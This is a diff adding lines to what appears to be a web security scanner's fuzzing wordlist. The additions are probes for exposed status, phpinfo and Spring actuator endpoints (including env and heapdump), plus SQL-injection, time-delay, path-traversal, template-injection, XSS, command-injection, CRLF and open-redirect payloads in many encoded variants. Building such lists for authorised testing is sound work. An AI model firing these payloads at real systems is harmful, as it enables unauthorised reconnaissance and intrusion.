@@ -78,3 +78,165 @@ HTTPS://EXAMPLE.COM
 %2FAPI
 %2FAPI%2FV1
 %2FSTATUS
+/server-status
+%2Fserver-status
+%252Fserver-status
+/SERVER-STATUS
+/server-status?aurose=1
+/server-status&aurose=1
+/server-status.bak
+/server-status.old
+/nginx_status
+%2Fnginx_status
+%252Fnginx_status
+/NGINX_STATUS
+/nginx_status?aurose=1
+/nginx_status&aurose=1
+/nginx_status.bak
+/nginx_status.old
+/phpinfo.php
+%2Fphpinfo.php
+%252Fphpinfo.php
+/PHPINFO.PHP
+/phpinfo.php?aurose=1
+/phpinfo.php&aurose=1
+/phpinfo.php.bak
+/phpinfo.php.old
+/trace
+%2Ftrace
+%252Ftrace
+/TRACE
+/trace?aurose=1
+/trace&aurose=1
+/trace.bak
+/trace.old
+/actuator
+%2Factuator
+%252Factuator
+/ACTUATOR
+/actuator?aurose=1
+/actuator&aurose=1
+/actuator.bak
+/actuator.old
+/actuator/env
+%2Factuator%2Fenv
+%252Factuator%252Fenv
+/ACTUATOR/ENV
+/actuator/env?aurose=1
+/actuator/env&aurose=1
+/actuator/env.bak
+/actuator/env.old
+/actuator/heapdump
+%2Factuator%2Fheapdump
+%252Factuator%252Fheapdump
+/ACTUATOR/HEAPDUMP
+/actuator/heapdump?aurose=1
+/actuator/heapdump&aurose=1
+/actuator/heapdump.bak
+/actuator/heapdump.old
+/.well-known/security.txt
+%2F.well-known%2Fsecurity.txt
+%252F.well-known%252Fsecurity.txt
+/.WELL-KNOWN/SECURITY.TXT
+/.well-known/security.txt?aurose=1
+/.well-known/security.txt&aurose=1
+/.well-known/security.txt.bak
+/.well-known/security.txt.old
+%2527%2520OR%2520%25271%2527%253D%25271
+'/**/OR/**/'1'='1
+' OR '1'%3d'1
+' OR '1'='1?aurose=1
+' OR '1'='1&aurose=1
+%2522%2520OR%2520%25221%2522%253D%25221
+"/**/OR/**/"1"="1
+" OR "1"%3d"1
+" OR "1"="1?aurose=1
+" OR "1"="1&aurose=1
+' AND 1=1 --
+%27%20AND%201%3D1%20--
+%2527%2520AND%25201%253D1%2520--
+'/**/AND/**/1=1/**/--
+' AND 1%3d1 --
+' AND 1=1 --?aurose=1
+' AND 1=1 --&aurose=1
+' AND 1=2 --
+%27%20AND%201%3D2%20--
+%2527%2520AND%25201%253D2%2520--
+'/**/AND/**/1=2/**/--
+' AND 1%3d2 --
+' AND 1=2 --?aurose=1
+' AND 1=2 --&aurose=1
+..%252F..%252F..%252F..%252Fetc%252Fpasswd
+../../../../etc/passwd?aurose=1
+../../../../etc/passwd&aurose=1
+..%255C..%255C..%255C..%255Cwindows%255Cwin.ini
+..\..\..\..\windows\win.ini?aurose=1
+..\..\..\..\windows\win.ini&aurose=1
+%2524%257B7%252A7%257D
+${7*7}?aurose=1
+${7*7}&aurose=1
+%257B%257B7%252A7%257D%257D
+{{7*7}}?aurose=1
+{{7*7}}&aurose=1
+<script>alert(document.domain)</script>
+%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+%253Cscript%253Ealert%2528document.domain%2529%253C%252Fscript%253E
+<SCRIPT>ALERT(DOCUMENT.DOMAIN)</SCRIPT>
+<script>alert(document.domain)</script>?aurose=1
+<script>alert(document.domain)</script>&aurose=1
+';SELECT pg_sleep(2)--
+%27%3BSELECT%20pg_sleep%282%29--
+%2527%253BSELECT%2520pg_sleep%25282%2529--
+';SELECT/**/pg_sleep(2)--
+';SELECT PG_SLEEP(2)--
+';SELECT pg_sleep(2)--?aurose=1
+';SELECT pg_sleep(2)--&aurose=1
+%2560id%2560
+`id`?aurose=1
+`id`&aurose=1
+$(id)
+%24%28id%29
+%2524%2528id%2529
+$(ID)
+$(id)?aurose=1
+$(id)&aurose=1
+${IFS}
+%24%7BIFS%7D
+%2524%257BIFS%257D
+${IFS}?aurose=1
+${IFS}&aurose=1
+%0d%0aX-Aurose: 1
+%250d%250aX-Aurose%3A%201
+%25250d%25250aX-Aurose%253A%25201
+%0d%0aX-Aurose:/**/1
+%0D%0AX-AUROSE: 1
+%0d%0aX-Aurose: 1?aurose=1
+%0d%0aX-Aurose: 1&aurose=1
+https://example.com/?next=https://evil.example
+https%3A%2F%2Fexample.com%2F%3Fnext%3Dhttps%3A%2F%2Fevil.example
+https%253A%252F%252Fexample.com%252F%253Fnext%253Dhttps%253A%252F%252Fevil.example
+https://example.com/?next%3dhttps://evil.example
+HTTPS://EXAMPLE.COM/?NEXT=HTTPS://EVIL.EXAMPLE
+https://example.com/?next=https://evil.example?aurose=1
+https://example.com/?next=https://evil.example&aurose=1
+/server-status::var0
+%2Fserver-status::v0
+/servermis/probe/0
+/nginx_status::var1
+%2Fnginx_status::v1
+/servermis/probe/1
+/phpinfo.php::var2
+%2Fphpinfo.php::v2
+/servermis/probe/2
+/trace::var3
+%2Ftrace::v3
+/servermis/probe/3
+/actuator::var4
+%2Factuator::v4
+/servermis/probe/4
+/actuator/env::var5
+%2Factuator%2Fenv::v5
+/servermis/probe/5
+/actuator/heapdump::var6
+%2Factuator%2Fheapdump::v6
+/servermis/probe/6
